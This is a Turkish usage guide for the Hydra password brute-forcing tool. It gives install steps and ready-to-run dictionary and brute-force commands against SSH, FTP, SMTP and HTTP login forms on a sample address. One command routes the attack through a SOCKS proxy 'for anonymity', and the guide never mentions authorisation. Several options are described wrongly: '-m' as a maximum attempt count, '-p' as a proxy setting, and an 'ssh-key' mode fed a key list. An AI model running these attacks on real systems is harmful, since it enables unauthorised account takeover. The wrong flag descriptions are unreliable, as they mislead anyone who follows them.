# Hydra Kullanım Kılavuzu

## Giriş
Hydra, parola kırma ve oturum açma işlemleri için kullanılan güçlü bir brute-force aracıdır. SSH, HTTP, FTP gibi birçok protokolü destekler ve geniş bir saldırı senaryosu yelpazesi sunar. Bu kılavuz, Hydra'nın kullanımını, komutlarını ve örneklerini detaylı bir şekilde ele alır.

---

## Kurulum

### 1. Gereksinimler
- **Desteklenen İşletim Sistemleri:** Linux, Windows, macOS
- **Bağımlılıklar:**
  - `libssl-dev`
  - `libssh-dev`

### 2. Kurulum Adımları
#### Linux
```bash
sudo apt update
sudo apt install -y hydra
```
Veya en son sürümü kaynak koddan derleyin:
```bash
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install
```

#### macOS
Homebrew ile yükleyebilirsiniz:
```bash
brew install hydra
```

#### Windows
Windows için bir sanal makine veya WSL kullanabilirsiniz. Hydra'nın derlenmiş bir sürümünü Windows üzerinde doğrudan kullanmak zordur.

---

## Temel Kullanım

### Komut Yapısı
```bash
hydra [seçenekler] hedef protokol
```

### Yardım Menüsü
Hydra'nın tüm seçeneklerini görmek için:
```bash
hydra -h
```

### Desteklenen Protokoller
Hydra birçok protokolü destekler, örneğin:
- SSH
- FTP
- HTTP
- SMTP
- RDP
Tüm desteklenen protokolleri görmek için:
```bash
hydra -U
```

---

## Saldırı Modları

### 1. **Dictionary Attack (Sözlük Saldırısı)**
Bir kullanıcı adı ve parola listesi ile giriş denemesi:
```bash
hydra -l admin -P passwords.txt 192.168.1.1 ssh
```
- `-l`: Kullanıcı adı
- `-P`: Parola dosyası

### 2. **Brute-Force Attack (Kaba Kuvvet Saldırısı)**
Belirli bir parola kombinasyonu oluşturmak için:
```bash
hydra -l admin -x 6:8:a 192.168.1.1 ssh
```
- `-x`: Parola uzunluğu ve karakter seti (ör. `6:8:a` 6 ile 8 arasında tüm küçük harf kombinasyonlarını dener).

### 3. **Paralel Saldırılar**
Birden fazla hedef üzerinde aynı anda saldırı:
```bash
hydra -L users.txt -P passwords.txt 192.168.1.1,192.168.1.2 ssh
```
- `-L`: Kullanıcı adı listesi

---

## Gelişmiş Kullanım

### HTTP Formları
Bir HTTP giriş formunu hedef almak için:
```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"
```
- `F=`: Başarısız giriş mesajını tanımlayın.

### Hedef Port Belirleme
Belirli bir portu hedeflemek için:
```bash
hydra -l admin -P passwords.txt 192.168.1.1 -s 2222 ssh
```
- `-s`: Port numarası

### SSH Anahtar Tabanlı Saldırılar
SSH anahtarı ile oturum açmayı denemek:
```bash
hydra -l admin -P private_keys.txt 192.168.1.1 ssh-key
```

---

## İpuçları

### Performans Artırma
- **Eşzamanlı İş Parçacıkları:**
  ```bash
  hydra -t 8 -l admin -P passwords.txt 192.168.1.1 ssh
  ```
  - `-t`: İş parçacığı sayısını belirler.

### Deneme Limiti
- Maksimum deneme sayısını ayarlayın:
  ```bash
  hydra -m 5 -l admin -P passwords.txt 192.168.1.1 ssh
  ```

### Proxy Kullanımı
Hydra ile anonimlik için proxy kullanabilirsiniz:
```bash
hydra -l admin -P passwords.txt -o results.txt -f -p socks5://127.0.0.1:9050 192.168.1.1 ssh
```

---

## Örnekler

### FTP Brute Force
```bash
hydra -L users.txt -P passwords.txt 192.168.1.1 ftp
```

### SMTP Sözlük Saldırısı
```bash
hydra -l admin -P passwords.txt 192.168.1.1 smtp
```

### HTTP GET İsteği
```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-get /protected
```

---

## Sorun Giderme

### Hatalar
1. **"No valid targets found" hatası:**
   - Hedef portun açık olduğundan emin olun.
2. **"Service not supported" hatası:**
   - Hydra'nın desteklediği protokol listesini kontrol edin.

### Loglama
Hydra'nın çıktısını log dosyasına kaydedebilirsiniz:
```bash
hydra -o log.txt -l admin -P passwords.txt 192.168.1.1 ssh
```

---

## Ek Kaynaklar
- [Hydra Resmi GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra Kullanım Belgeleri](https://github.com/vanhauser-thc/thc-hydra/blob/master/README.md)
- [Hedef Protokoller ve Örnekler](https://tools.kali.org/password-attacks/hydra)

---

## Katkıda Bulunanlar
Bu kılavuz, Hydra kullanımını detaylı olarak ele almak için hazırlanmıştır. Önerileriniz ve katkılarınız için iletişime geçmekten çekinmeyin!
